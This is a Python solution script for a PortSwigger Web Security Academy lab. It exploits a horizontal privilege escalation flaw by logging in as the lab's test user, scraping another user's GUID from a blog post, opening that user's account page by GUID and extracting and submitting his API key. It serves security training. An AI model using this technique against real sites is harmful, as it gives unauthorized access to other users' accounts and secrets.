'''This lab has a horizontal privilege escalation vulnerability on the user account page, but identifies users with GUIDs.

To solve the lab, find the GUID for carlos, then submit his API key as the solution.

You can log in to your own account using the following credentials: wiener:peter

Lab link: https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids
'''

import requests
from bs4 import BeautifulSoup
import re

lab_id = '0a5b00ad032edfcc841b40e9007200ff' # change according to generated lab_id
s = requests.Session()


def token_extract(resp): # function for parsing the csrf token when needed
    soup = BeautifulSoup(resp, 'lxml')
    return soup.find('input', {'name': 'csrf'})['value']


def guid_extract(resp): # function for parsing the guid from a user link
    soup = BeautifulSoup(resp, 'html.parser')
    links = [link.get('href') for link in soup.find_all('a') if 'userId' in link.get('href')]
    return links[0].split("=")[1]


def main():
    # First we need to login as wiener:peter as provided in the instructions
    uri = f"https://{lab_id}.web-security-academy.net/login"
    r = s.get(uri) 
    token = token_extract(r.text) # login csrf token

    # data for the post request to login
    data = { 'username' : "wiener",
            'password' : "peter",
            'csrf': token
    }
    r2 = s.post(uri, data=data)

    # To get the GUID of carlos, navigate to one of post made by the user
    uri = f"https://{lab_id}.web-security-academy.net/post?postId=9"
    r3 = s.get(uri)
    # The GUID is in the author link, extract it.
    guid = guid_extract(r3.text)
    print(f"GUID is : {guid}")

    # Now go to the account page of carlos using the user id
    uri = f"https://{lab_id}.web-security-academy.net/my-account?id={guid}"
    r4 = s.get(uri)
    # extract the API key from the response
    if "API" in r4.text:
        key = re.search(r'API Key is: (\w+)', r4.text)
        print(f'Submitting key: {key[1]}')

    # Submit the API key to finish the lab
    uri = f"https://{lab_id}.web-security-academy.net/submitSolution"
    data = { 'answer' : key[1] }
    r5 = requests.post(uri, data=data)
    print('finished')

if __name__ == '__main__':
    main()